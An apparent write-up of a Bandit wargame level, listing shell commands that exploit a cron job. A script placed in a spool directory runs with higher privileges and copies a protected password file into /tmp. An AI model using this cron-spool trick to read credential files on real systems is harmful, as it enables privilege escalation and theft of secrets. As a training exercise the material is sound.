# Goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. -Look in /etc/cron.d/ for the configuration and see what command is being executed.

# Commands Used
>cat /etc/cron.d/cronjob_bandit24
>
>cat /usr/bin/cronjob_bandit24.sh
>
>mkdir /tmp/b23
>
>cd /tmp/b23
>
>cat > script.sh << 'EOF'
>
>   #!/bin/bash
>
>   cat /etc/bandit_pass/bandit24 > /tmp/bandit23_password
>
>chmod +x script.sh
>
>cp script.sh /var/spool/bandit24/foo/
>
> cat /tmp/bandit23_password

# Problems Faced 
spent a lot of time fixing the permissions